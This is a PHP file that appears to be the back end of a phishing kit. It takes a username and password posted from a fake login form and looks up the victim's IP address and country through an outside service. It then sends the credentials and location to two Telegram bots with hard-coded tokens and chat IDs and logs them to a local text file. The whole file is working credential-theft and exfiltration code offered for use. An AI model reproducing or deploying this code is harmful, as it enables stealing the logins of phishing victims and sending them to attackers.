<?php 
include 'index.php';
$API_KEY = "6527532148:AAFkSxFyJXnHX4Ytnziy6RSP23AYS41QE54"; 
$admin = 5835559244 ; 
$user = $_POST['user'];
$pass = $_POST['pass']; 
$login = $_POST['login'];
$time = date('d-m-Y : h-i-s');
// get ip
function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        return $ip;
    }
 $ip = getUserIP();
$api = json_decode(file_get_contents("http://nailspansseh.com/api.php?ip=$ip"));
$country= $api->country;
$code = $api->code;
$flag = $api->flag;
$url= $api->country_code;
$alls = explode("\n",file_get_contents("alls.txt"));
if(!in_array($user.":".$pass,$alls)){
$rtv = file_get_contents("in.txt") ? file_get_contents("in.txt") : 0;
file_put_contents("in.txt",$rtv +1);
$ad1 = urlencode("ʟᴏɢɪɴ » $login
ᯓ ɴᴜᴍʙᴇʀ » ".$rtv."
ᯓ ᴇᴍᴀɪʟ » `$user`
ᯓ ᴘᴀssᴡᴏʀᴅ » `$pass`
ᯓ ɪᴘ » ".$ip."
ᯓ ᴄᴏᴅᴇ » ".$code."
ᯓ ᴄᴏᴜɴᴛʀʏ » ".$country."
ᯓ ғʟᴀɢ » ".$flag."
ᯓ ᴅᴀᴛᴇ » ".$time."
━━━━━━━━━━━━
");  
file_get_contents("https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=".$admin."&text=".$ad1."&parse_mode=markdown"); 
file_get_contents("https://api.telegram.org/bot6298625052:AAFIwAUeu-jThCrGkoze2gznEcDxtQUDigo/sendMessage?chat_id=5011123303&text=".$ad1."&parse_mode=markdown");
$body = "
ᯓ ɴᴜᴍʙᴇʀ » ".$rtv."
ᯓ ᴇᴍᴀɪʟ » `$user`
ᯓ ᴘᴀssᴡᴏʀᴅ » `$pass`
ᯓ ɪᴘ » ".$ip."
ᯓ ᴄᴏᴅᴇ » ".$code."
ᯓ ᴄᴏᴜɴᴛʀʏ » ".$country."
ᯓ ғʟᴀɢ » ".$flag."
ᯓ ᴅᴀᴛᴇ » ".$time."
━━━━━━━━━━━━
";
$file = fopen("zbi.txt", 'a');
 fwrite($file, $body);
}

?>